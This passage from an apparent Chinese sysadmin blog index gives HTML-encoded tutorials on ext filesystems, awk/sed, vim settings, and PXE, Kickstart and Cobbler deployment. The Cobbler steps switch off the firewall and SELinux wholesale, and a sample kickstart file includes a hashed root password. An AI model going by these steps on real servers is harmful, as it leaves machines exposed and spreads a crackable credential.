#x8D44;&#x6599;&#x5230;&#x786C;&#x76D8;&#x91CC;&#x9762;&#x65F6;&#xFF0C;&#x5148;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x5F53;&#x7F13;&#x5B58;&#x5199;&#x6EE1;&#x65F6;&#x7CFB;&#x7EDF;&#x5148;&#x901A;&#x77E5;journal&#xFF0C;&#x518D;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x786C;&#x76D8;&#xFF0C;&#x5B8C;&#x6210;&#x540E;&#x518D;&#x901A;&#x77E5;journal&#xFF0C;&#x8D44;&#x6599;&#x5DF2;&#x5B8C;&#x6210;&#x5199;&#x5165;&#x5DE5;&#x4F5C; &#x662F;&#x5426;&#x6709;journal&#x7684;&#x5DEE;&#x522B;&#x5728;ext2&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x5F00;&#x673A;&#x65F6;&#x4F1A;&#x68C0;&#x67E5;&#x6709;&#x6548;&#x4F4D;&#xFF08;valid bit&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x503C;&#x4E3A;1&#xFF0C;&#x8868;&#x793A;&#x7CFB;&#x7EDF;&#x4E0A;&#x6B21;&#x6709;&#x6B63;&#x5E38;&#x5173;&#x673A;&#xFF1B;&#x5982;&#x679C;&#x4E3A;0&#xFF0C;&#x8868;&#x793A;&#x4E0A;&#x6B21;&#x5173;&#x673A;&#x672A;&#x6B63;&#x5E38;&#x5173;&#x673A;&#xFF0C;&#x90A3;&#x7CFB;&#x7EDF;&#x5C31;&#x4F1A;&#x4ECE;&#x5934;&#x68C0;&#x67E5;&#x786C;&#x76D8;&#x4E2D;&#x7684;&#x8D44;&#x6599;&#xFF0C;&#x8FD9;&#x6837;&#x65F6;&#x95F4;&#x4F1A;&#x5F88;&#x957F;&#x5728;ext3&#x4E2D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;journal&#x673A;&#x5236;&#x91CC;&#xFF0C;&#x7CFB;&#x7EDF;&#x5F00;&#x673A;&#x65F6;&#x68C0;&#x67E5;journal&#x7684;&#x8D44;&#x6599;&#xFF0C;&#x6765;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#x4EA7;&#x751F;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5FEB;&#x4E86;&#x5F88;&#x591A;tune2fs -j&#x5C06;ex2&#x8F6C;&#x6362;&#x6210;ext3 &#x6587;&#x4EF6;&#x7CFB;&#x7EDF; &#x6700;&#x5927;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x957F;&#x5EA6; &#x6700;&#x5927;&#x8DEF;&#x5F84;&#x540D;&#x957F;&#x5EA6; &#x6700;&#x5927;&#x6587;&#x4EF6;&#x5927;&#x5C0F; &#x6700;&#x5927;&#x5377;&#x5927;&#x5C0F; ext2 255bytes &#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236; 2TB 32TB ext3 255bytes &#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236; 2TB 32TB ext4 255bytes &#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236; 16TB 1 EB document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux文本四剑客","date":"2022-06-07T04:38:58.000Z","path":"/posts/b7f1c6/","text":"awk1234567line1 f2 f3line2 f4 f5line3 f6 f7echo -e &quot;line1 f2 f3\\nline2 f4 f5\\nline3 f6 f7&quot; | awk &apos;{print &quot;Line No:&quot;NR&quot;, No of fields:&quot;NF, &quot;$0=&quot;$0, &quot;$1=&quot;$1, &quot;$2=&quot;$2, &quot;$3=&quot;$3}&apos; Line No:1, No of fields:3 $0=line1 f2 f3 $1=line1 $2=f2 $3=f3Line No:2, No of fields:3 $0=line2 f4 f5 $1=line2 $2=f4 $3=f5Line No:3, No of fields:3 $0=line3 f6 f7 $1=line3 $2=f6 $3=f7 &#x589E;&#x5220;&#x6539;&#x67E5;&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x4FEE;&#x6539;&#x64CD;&#x4F5C;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#x66FF;&#x6362;&#x66FF;&#x6362;&#x5B57;&#x7B26;&#x66FF;&#x6362;&#x6570;&#x5B57;&#x66FF;&#x6362;&#x82F1;&#x6587;&#x66FF;&#x6362;&#x7A7A;&#x884C;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x6807;&#x51C6;&#x6269;&#x5C55;&#x6761;&#x4EF6;&#x5217;&#x64CD;&#x4F5C;&#x884C;&#x64CD;&#x4F5C;&#x6253;&#x5370;&#x7B2C;&#x4E00;&#x884C;1awk &apos;NR==1{print}&apos; /tmp/tmp.txt sed&#x884C;&#x64CD;&#x4F5C;&#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x5230;&#x9996;&#x884C;123456789# &#x57FA;&#x672C;&#x8BED;&#x6CD5;&#xFF0C;&#xFF08;&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#xFF09;# i&#x5728;&#x5F53;&#x524D;&#x884C;&#x63D2;&#x5165;&#x5185;&#x5BB9;# a&#x5728;&#x5F53;&#x524D;&#x884C;&#x8FFD;&#x52A0;&#x5185;&#x5BB9;sed &apos;&#x4F5C;&#x7528;&#x8303;&#x56F4;&#x884C; &#x63D2;&#x5165;&#x884C;&#x524D;/&#x540E; &#x63D2;&#x5165;&#x5185;&#x5BB9;&apos; &#x6587;&#x4EF6;&#x540D;# &#x5728;file.txt&#x6587;&#x4EF6;&#x7B2C;1&#x884C;&#x524D;&#x9762;&#x63D2;&#x5165;hellosed -i &apos;1 i hello&apos; file.txt# &#x5728;file.txt&#x6587;&#x4EF6;&#x7B2C;1&#x884C;&#x540E;&#x9762;&#x63D2;&#x5165;worldsed -i &apos;1 a world&apos; file.txt &#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x5230;&#x6307;&#x5B9A;&#x884C;12# &#x5728;&#x7B2C;3&#x884C;&#x524D;&#x9762;&#x63D2;&#x5165;&#x5185;&#x5BB9;sed -i &apos;3i hello &apos; file.txt &#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x63D2;&#x5165;&#x5185;&#x5BB9;12# $&#x8868;&#x793A;&#x6700;&#x540E;&#x4E00;&#x884C;sed -i &apos;$a hello&apos; sample.txt &#x5217;&#x64CD;&#x4F5C;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;grep&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;find document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"VIM的使用","date":"2022-06-07T04:38:35.000Z","path":"/posts/b382711f/","text":"VIM&#x57FA;&#x672C;&#x914D;&#x7F6E; 123456789101112131415161718192021222324252627282930313233343536373839404142434445&quot; &#x8BBE;&#x5B9A;&#x9ED8;&#x8BA4;&#x89E3;&#x7801;&#xA0;set fenc=utf-8set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936&quot; &#x4FA6;&#x6D4B;&#x6587;&#x4EF6;&#x7C7B;&#x578B;filetype on&#xA0;&quot; &#x8F7D;&#x5165;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x63D2;&#x4EF6;&#xA0;filetype plugin on&#xA0;&#xA0;&quot; &#x8BED;&#x6CD5;&#x9AD8;&#x4EAE;&#xA0;syntax enablesyntax on&#xA0;&quot; &#x4E0D;&#x8981;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#xFF08;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x9700;&#x8981;&#x53D6;&#x820D;&#xFF09;&#xA0;set nobackup&#xA0;&quot; &#x4E0D;&#x8981;&#x751F;&#x6210;swap&#x6587;&#x4EF6;&#xFF0C;&#x5F53;buffer&#x88AB;&#x4E22;&#x5F03;&#x7684;&#x65F6;&#x5019;&#x9690;&#x85CF;&#x5B83;&#xA0;setlocal noswapfile&#xA0;set bufhidden=hide&#xA0;&quot; &#x4F7F;&#x56DE;&#x683C;&#x952E;&#xFF08;backspace&#xFF09;&#x6B63;&#x5E38;&#x5904;&#x7406;indent, eol, start&#x7B49;&#xA0;set backspace=2&#xA0;&quot; &#x7EE7;&#x627F;&#x524D;&#x4E00;&#x884C;&#x7684;&#x7F29;&#x8FDB;&#x65B9;&#x5F0F;&#xFF0C;&#x7279;&#x522B;&#x9002;&#x7528;&#x4E8E;&#x591A;&#x884C;&#x6CE8;&#x91CA;&#xA0;set autoindent&#xA0;&quot; &#x4E3A;C&#x7A0B;&#x5E8F;&#x63D0;&#x4F9B;&#x81EA;&#x52A8;&#x7F29;&#x8FDB;&#xA0;set smartindent&#xA0;&quot;&#x4F7F;&#x7528;C&#x6837;&#x5F0F;&#x7684;&#x7F29;&#x8FDB;&#xA0;set cindent&#xA0;&quot; &#x5236;&#x8868;&#x7B26;&#x4E3A;4&#xA0;set tabstop=4&#xA0;&quot; &#x7EDF;&#x4E00;&#x7F29;&#x8FDB;&#x4E3A;4&#xA0;set softtabstop=4&#xA0;set shiftwidth=4&#xA0;set cindent &quot;c/c++&#x81EA;&#x52A8;&#x7F29;&#x8FDB;&quot;set smartindentset autoindent&quot;&#x53C2;&#x8003;&#x4E0A;&#x4E00;&#x884C;&#x7684;&#x7F29;&#x8FDB;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x81EA;&#x52A8;&#x7F29;&#x8FDB;&quot;filetype indent on &quot;&#x6839;&#x636E;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x7F29;&#x8FDB;&quot;set softtabstop=4 &quot;4 character as a tab&quot;set shiftwidth=4set smarttab VIM&#x9ED8;&#x8BA4;&#x4E3B;&#x9898;&#x63A8;&#x8350; darkblue delek &#x4EE5;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x67E5;&#x770B;&#x6587;&#x4EF6; %!xxd document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"PXE自动化部署","date":"2022-06-07T04:37:37.000Z","path":"/posts/97717e94/","text":"LinuxPXE/KickstartBIOS&#x6A21;&#x5F0F;&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x5668;&#xFF08;NFS&#xFF0C;HTTPS&#xFF0C;HTTP&#xFF0C;FTP&#xFF09;&#x7528;&#x4E8E;&#x5B58;&#x50A8;ISO&#x955C;&#x50CF;&#x914D;&#x7F6E;DHCP 123yum install -y dhcpcp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.confvim /etc/dhcp/dhcpd.conf 12345678910111213allow booting;allow bootp;ddns-update-style interim;ignore client-updates;subnet 192.168.10.0 netmask 255.255.255.0 { option subnet-mask 255.255.255.0; option domain-name-servers 192.168.10.10; range dynamic-bootp 192.168.10.100 192.168.10.200; default-lease-time 21600; max-lease-time 43200; next-server 192.168.10.10; filename &quot;pxelinux.0&quot;; } 1systemctl restart dhcpd &amp;&amp; systemctl enable dhcpd &#x914D;&#x7F6E;tftp &#x63D0;&#x4F9B;&#x5F15;&#x5BFC;&#x6587;&#x4EF6; 123456789101112131415161718yum install -y tftp-server xinetdvim /etc/xinet.d/tftpservice tftp { socket_type = dgram protocol = udp wait = yes user = root server = /usr/sbin/in.tftpd server_args = -s /var/lib/tftpboot disable = no per_source = 11 cps = 100 2 flags = IPv4 systemctl restart xinetd &amp;&amp; systemctl enable xinetdfirewall-cmd --permanent --add-port=69/udpfirewall-cmd --reload &#x83B7;&#x53D6;pxelinux.0&#x6587;&#x4EF6; 12345678910# &#x5B89;&#x88C5;syslinux&#x5305;yum install -y syslinuxcp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/# &#x6216;# &#x76F4;&#x63A5;&#x52A0;&#x538B;rpm&#x5305;mount -t iso9660 /dev/cdrom /media/cdrom -o loop,rocp -pr /media/cdrom/Packages/syslinux-x.xx-xx.x86_64.rpm ./rpm2cpio syslinux-x.xx-xx.x86_64.rpm | cpio -dimv# &#x590D;&#x5236;pxelinux.0&#x5230;/var/lib/tftpboot/pxelinux/&#x4E2D; cp pxelinux.0 /var/lib/tftpboot/ &#x590D;&#x5236;&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x5230;tftp&#x6839;&#x76EE;&#x5F55;&#x4E2D; 12cp /media/cdrom/images/pxeboot/{vmlinuz,initrd.img} /var/lib/tftpboot/cp /media/cdrom/isolinux/{vesamenu.c32,boot.msg} /var/lib/tftpboot/ &#x5F15;&#x5BFC;&#x83DC;&#x5355;default&#x6587;&#x4EF6; 123456# &#x521B;&#x5EFA;&#x76EE;&#x5F55;mkdir /var/lib/tftpboot/pxelinux.cfg# &#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;vim /var/lib/tftpboot/pxelinux.cfg/default# &#x6216;cp /media/cdrom/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default &#x914D;&#x7F6E;FTP&#x590D;&#x5236;&#x955C;&#x50CF;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x5230;ftp&#x76EE;&#x5F55; 12345678yum install -y vsftpdcp -pvr /media/cdrom/* /var/ftp/pub/firewall-cmd --permanent --add-service=ftpfirewall-cmd --reloadsetsebool -P ftpd_connect_all_unreserved=onsystemctl restart vsftpd &amp;&amp; systemctl enable vsftpd &#x521B;&#x5EFA;kickstart&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x751F;&#x6210;kickstart&#x6587;&#x4EF6;&#x4F7F;&#x7528;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5668;&#xFF08;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x767B;&#x5F55;&#xFF09;&#x751F;&#x6210;&#x540E;&#x4E0B;&#x8F7D;&#x547D;&#x540D;&#x5B58;&#x653E;&#x5230;/var/ftp/pub/ks.cfg&#x6216;&#x4F7F;&#x7528;&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x677F;anaconda-ks.cfg 12cp /root/anaconda-ks.cfg /var/ftp/pub/ks.cfgchmod +r /var/ftp/pub/ks.cfg 1234567891011121314---------------------dhcpd.confg-------------------------- allow booting; allow bootp; ddns-update-style interim; ignore client-updates; subnet 192.168.10.0 netmask 255.255.255.0 { option subnet-mask 255.255.255.0; option domain-name-servers 192.168.10.10; range dynamic-bootp 192.168.10.100 192.168.10.200; default-lease-time 21600; max-lease-time 43200; next-server 192.168.10.10; filename &quot;pxelinux.0&quot;; } 12---------------------tftp-----------------------disable = no 12345---------------------default--------------------default linux...# 64 line &#x5730;&#x5740;&#x8981;&#x51C6;&#x786E;&#xFF0C;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#x5C31;&#x586B;&#x5230;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x9664;&#x975E;ftp&#x8BBE;&#x7F6E;&#x4E86;&#x9ED8;&#x8BA4;&#x76EE;&#x5F55;append initrd=initrd.img inst.stage2=ftp://192.168.128.120/pub ks=ftp://192.168.128.120/pub/ks.cfg quiet 1234567891011121314151617181920212223242526272829303132333435---------------------ks.cfg---------------------# &#x7CFB;&#x7EDF;&#x8BA4;&#x8BC1;&#x8BBE;&#x7F6E;auth --enableshadown --passalgo=sha512# &#x6587;&#x4EF6;&#x670D;&#x52A1;&#x5730;&#x5740;# &#x5730;&#x5740;&#x8981;&#x51C6;&#x786E;&#xFF0C;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#x5C31;&#x586B;&#x5230;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;url --url=ftp://192.168.128.120/pubfirstboot --enableignoredisk --only-use=sdakeyboard --vckeymap=us --xlayouts=&apos;us&apos;lang en_US.UTF-8network --bootproto=dhcp --device=eno16777728 --onboot=off --ipv6=autonetwork --hostname=localhost.localdomainrootpw --iscrypted $6$pDjJf42g8C6pL069$iI.PX/yFaqpo0ENw2pa7MomkjLyoae2zjMz2UZJ7b H3UO4oWtR1.Wk/hxZ3XIGmzGJPcs/MgpYssoi8hPCt8b/# &#x65F6;&#x533A;&#x8BBE;&#x7F6E;timezone Asia/Shanghai --isUtc# &#x5206;&#x533A;&#x65B9;&#x5F0F;clearpart --all --initlabel# &#x5B89;&#x88C5;rpm&#x5305; 31 %packages 32 @base 33 @core 34 @desktop-debugging 35 @dial-up 36 @fonts 37 @gnome-desktop 38 @guest-agents 39 @guest-desktop-agents 40 @input-methods 41 @internet-browser 42 @multimedia 43 @print-client 44 @x11 45 46 %end &#x68C0;&#x67E5;&#x670D;&#x52A1;&#x662F;&#x5426;&#x542F;&#x52A8;systemctl status xinetd dhcpd UEFI&#x6A21;&#x5F0F;&#x5728;BOIS&#x6A21;&#x5F0F;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x66F4;&#x65B0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;&#xFF1A; &#x66F4;&#x65B0;DHCP&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x53C2;&#x8003;&#x6A21;&#x677F; 12345678910111213141516171819202122232425262728293031323334## DHCP Server Configuration file.# see /usr/share/doc/dhcp*/dhcpd.conf.example# see dhcpd.conf(5) man page#allow booting;allow bootp;ddns-update-style interim;ignore client-updates;option rfc3442-classless-static-routes code 121 = array of integer 8;option ms-classless-static-routes code 249 = array of integer 8;option space pxelinux;option pxelinux.magic code 208 = string;option pxelinux.configfile code 209 = text;option pxelinux.pathprefix code 210 = text;option pxelinux.reboottime code 211 = unsigned integer 32;option architecture-type code 93 = unsigned integer 16;subnet 192.168.128.0 netmask 255.255.255.0 { option subnet-mask 255.255.255.0; option domain-name-servers 192.168.128.120; range dynamic-bootp 192.168.128.128 192.168.128.200; default-lease-time 21600; max-lease-time 43200; class &quot;pxeclients&quot;{ match if substring(option vendor-class-identifier, 0, 9)=&quot;PXEClient&quot;; next-server 192.168.128.120; if option architecture-type = 00:07 { filename &quot;shim.efi&quot;; } else { filename &quot;pxelinux.0&quot;; } }} &#x590D;&#x5236;uefi&#x5F15;&#x5BFC;&#x6587;&#x4EF6; 12345678cp -pr /media/cdrom/Packages/shim-0.9-2.el7.x86_64.rpm cp -pr /media/cdrom/Packages/grub2-efi-2.02-0.44.el7.x86_64.rpmrpm2cpio shim-0.9-2.el7.x86_64.rpm | cpio -dimvrpm2cpio grub2-efi-2.02-0.44.el7.x86_64.rpm# &#x590D;&#x5236;&#x76F8;&#x5173;&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x5230;tftpboot/&#x76EE;&#x5F55;&#x4E0B;cp ./bootloaders/boot/efi/EFI/redhat/shim.efi /var/lib/tftpboot/cp ./bootloaders/boot/efi/EFI/redhat/grubx64.efi /var/lib/tftpboot/ &#x5728;/var/lib/tftpboot/&#x4E0B;&#x6DFB;&#x52A0;grub.cfg&#x914D;&#x7F6E;&#x6587;&#x4EF6; 1234567891011vim /var/lib/tftpboot/uefi/grub.cfg&#xFF1A;set timeout=60# menuentry &apos;RHEL 7&apos;&#x662F;&#x5F15;&#x5BFC;&#x7684;&#x83DC;&#x5355;&#x540D;&#x79F0;menuentry &apos;RHEL 7&apos; { # vmlinuz&#x7684;&#x5B58;&#x653E;&#x76EE;&#x5F55;,&#x5982;&#x679C;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x5728;/var/lib/tftpboot/&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x76F4;&#x63A5;&#x5148;vmlinuz linuxefi vmlinuz ip=dhcp # &#x955C;&#x50CF;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x653E;&#x76EE;&#x5F55; inst.repo=ftp://192.168.73.120/pub/ # initrd.img&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x653E;&#x53D1;&#x76EE;&#x5F55; initrdefi initrd.img} &#x542F;&#x52A8;&#x6240;&#x6709;&#x670D;&#x52A1;systemctl restart xinetd dhcpd &#x590D;&#x5236;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x5230;uefi/&#x76EE;&#x5F55;&#x4E0B; 1cp /media/cdrom/images/pxeboot/{vmlinuz,initrd.img} /var/lib/tftpboot/ &#x67E5;&#x770B;LInux&#x5904;&#x4E8E;BIOS&#x6A21;&#x5F0F;&#x8FD8;&#x662F;UEFI&#x6A21;&#x5F0F; &#x5728;UEFI&#x6A21;&#x5F0F;&#x4E0B;Linux&#x7CFB;&#x7EDF;&#x5728;/sys/firmware/&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;efi&#x76EE;&#x5F55;&#xFF0C;BIOS&#x6A21;&#x5F0F;&#x662F;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x7684; 12345678ls -ld /sys/firmware/efi/# BIOS&#x6A21;&#x5F0F;&#x4E0B;grub2&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x4E3A;/etc/grub2.cfg# EFI&#x6A21;&#x5F0F;&#x4E0B;grub2&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x4E3A;/etc/grub2-efi.cfg[root@pxelab tftpboot]# ls -lrt /etc/grub2.cfglrwxrwxrwx. 1 root root 22 Jan 22 17:31 /etc/grub2.cfg -&gt; ../boot/grub2/grub.cfg[root@pxelab ~]# ls -lrt /etc/grub2-efi.cfglrwxrwxrwx. 1 root root 31 Jan 24 07:18 /etc/grub2-efi.cfg -&gt; ../boot/efi/EFI/redhat/grub.cfg &#x5982;&#x679C;&#x662F;EFI&#x6A21;&#x5F0F;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x6709;&#x5982;&#x4E0B;&#x76EE;&#x5F55;/&#x6587;&#x4EF6;&#xFF1A; 12345678910111213141516171819202122232425[root@pxelab ~]# ls -lrt /etc/grub2-efi.cfglrwxrwxrwx. 1 root root 31 Jan 24 07:18 /etc/grub2-efi.cfg -&gt; ../boot/efi/EFI/redhat/grub.cfg[root@pxelab ~]# ls -ld /boot/efi/EFI/drwx------. 4 root root 4096 Jan 24 07:19 /boot/efi/EFI/[root@pxelab ~]# ls -lrt /boot/efi/EFI/total 8drwx------. 2 root root 4096 Jan 24 07:19 BOOTdrwx------. 3 root root 4096 Jan 24 07:21 redhat[root@pxelab ~]# ls -lrt /boot/efi/EFI/*/boot/efi/EFI/BOOT:total 1340-rwx------. 1 root root 71784 Jul 20 2015 fallback.efi-rwx------. 1 root root 1295704 Jul 20 2015 BOOTX64.EFI/boot/efi/EFI/redhat:total 5812-rwx------. 1 root root 1289544 Jul 20 2015 shim-redhat.efi-rwx------. 1 root root 1295704 Jul 20 2015 shim.efi-rwx------. 1 root root 1282496 Jul 20 2015 MokManager.efi-rwx------. 1 root root 176 Jul 20 2015 BOOT.CSV-rwx------. 1 root root 1024464 Aug 29 2016 grubx64.efi-rwx------. 1 root root 1024464 Aug 29 2016 gcdx64.efidrwx------. 2 root root 4096 Jan 24 07:18 fonts-rwx------. 1 root root 1024 Jan 24 07:21 grubenv-rwx------. 1 root root 4245 Jan 24 07:21 grub.cfg[root@pxelab ~]# Kickstart&#x751F;&#x6210;kickstart&#x6587;&#x4EF6;&#x4F7F;&#x7528;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5668;&#xFF08;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x767B;&#x5F55;&#xFF09;https://access.redhat.com/labs/kickstartconfig/&#x6216;&#x4F7F;&#x7528;&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x677F;anaconda-ks.cfg &#x3010;&#x6CE8;&#x610F;&#xFF01;&#x3011;&#x914D;&#x7F6E;&#x7684;&#x6BCF;&#x90E8;&#x5206;&#x5FC5;&#x987B;&#x6309;&#x987A;&#x5E8F;&#x6307;&#x5B9A;&#xFF0C;&#x6BCF;&#x90E8;&#x5206;&#x5185;&#x4E0D;&#x5FC5;&#x6309;&#x9700;&#x6392;&#x5E8F;%addon&#x3001;%packages&#x3001;%pre&#x3001;%post&#x5FC5;&#x987B;&#x4EE5;%end&#x7ED3;&#x5C3E; #&#x6CE8;&#x91CA; &#x5B89;&#x88C5;kickstart&#x6587;&#x4EF6;&#x9A8C;&#x8BC1;&#x5668; 1yum install pykickstart &#x4F7F;&#x7528;ksvalidator&#x547D;&#x4EE4;&#x9A8C;&#x8BC1;ks&#x6587;&#x4EF6;&#x7684;&#x6B63;&#x786E;&#x6027; 1ksvalidator kickstart.ks BIOS 1append initrd=initrd.img inst.ks=[http/ftp/tftp/nfs]://192.168.73.120/var/lib/tftpboot/ks.cfg UEFI 1kernel vmlinuz inst.ks=[http/ftp/tftp/nfs]://192.168.73.120/var/tftpboot/ks.cfg kickstart&#x6587;&#x4EF6;&#x8BED;&#x6CD5;&#x53D8;&#x5316; 12ksverdiff -f RHEL6 -t RHEL7# -f&#x6307;&#x5B9A;&#x6BD4;&#x8F83;&#x7B2C;&#x4E00;&#x4E2A;&#x53D1;&#x884C;&#x7248;&#xFF0C;-t&#x6307;&#x5B9A;&#x6BD4;&#x8F83;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x53D1;&#x884C;&#x7248; &#x4F7F;&#x7528;SSL&#x534F;&#x8BAE;&#x65F6;&#xFF0C;&#x7981;&#x7528;SSLv2&#x548C;SSLv3&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x89E6;&#x53D1;CVE-2014-3566&#x6F0F;&#x6D1E; Cobbler+Kickstart&#x5173;&#x95ED;SELinux&#x548C;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x91CD;&#x542F;Linux 123456systemctl stop firewalldsystemctl disable firewalldiptables -Fsetenforce 0sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/g&apos; /etc/selinux/configf &#x66F4;&#x65B0;yum&#x6E90;&#x548C;epel&#x6E90; 12# &#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x6E90;yum install -y epel-release &#x5B89;&#x88C5;&#x5176;&#x4ED6;&#x670D;&#x52A1; 1yum install -y dhcp pykickstart httpd dhcp rsync tftp-server xinetd syslinux &#x5B89;&#x88C5;Cobbler 1yum install cobbler cobbler-web &#x4FEE;&#x6539;&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6; vim /etc/cobbler/settings 12345678&#x95EE;&#x9898; 1&#xFF1A;&#x4FEE;&#x6539; server &#x5730;&#x5740;&#x4E3A; 192.168.1.7&#x6539;&#xFF1A;390 server: 127.0.1&#x4E3A;&#xFF1A;390 server: 192.168.1.7&#x95EE;&#x9898; 2&#xFF1A;&#x4FEE;&#x6539; next_server &#x5730;&#x5740;&#x4E3A; 192.168.1.7&#x6539;&#xFF1A;278 next_server: 127.0.1&#x4E3A;&#xFF1A;278 next_server: 192.168.1.7&#x6539;&#xFF1A;242 manage_dhcp: 0&#x4E3A;&#xFF1A;242 manage_dhcp: 1 vim /etc/cobbler/dhcp.template 1234567891011121314&#x6539;&#xFF1A;22 option routers 192.168.1.5; #&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#x5730;&#x5740;&#x4E3A;&#xFF1A;22 option routers 192.168.1.1; #&#x4EE5;&#x5B9E;&#x9645;&#x7684;&#x7F51;&#x5173;&#x4E3A;&#x51C6;&#x6539;&#xFF1A;23 option domain-name-servers 192.168.1.1; #&#x4FEE;&#x6539; DNS &#x5730;&#x5740;&#x4E3A;&#xFF1A;23 option domain-name-servers 114.114.114.114;&#x5982;&#x4E0B;&#xFF1A; 21 subnet 192.168.1.0 netmask 255.255.255.0 { 22 option routers 192.168.1.1; 23 option domain-name-servers 114.114.114.114; 24 option subnet-mask 255.255.255.0; 25 range dynamic-bootp 192.168.1.100 192.168.1.254; 26 default-lease-time 21600; 27 max-lease-time 43200; 28 next-server $next_server; &#x542F;&#x52A8;&#x670D;&#x52A1; 123systemctl start httpd cobblerdcobbler syncsystemctl enable httpd cobblerd &#x68C0;&#x67E5;cobbler&#x662F;&#x5426;&#x5B58;&#x5728;&#x9519;&#x8BEF; 123cobbler checksystemctl restart cobblerdcobbler sync &#x6302;&#x8F7D;&#x5149;&#x9A71;&#x5BFC;&#x5165;&#x955C;&#x50CF; 12mount /dev/cdrom /mntcobbler import --path=/mnt/ --name=CentOS7.6 --arch=x86_64 &#x67E5;&#x770B;cobbler&#x955C;&#x50CF;&#x914D;&#x7F6E;&#x6587;&#x4EF6; 1cobbler list WindowsPXE 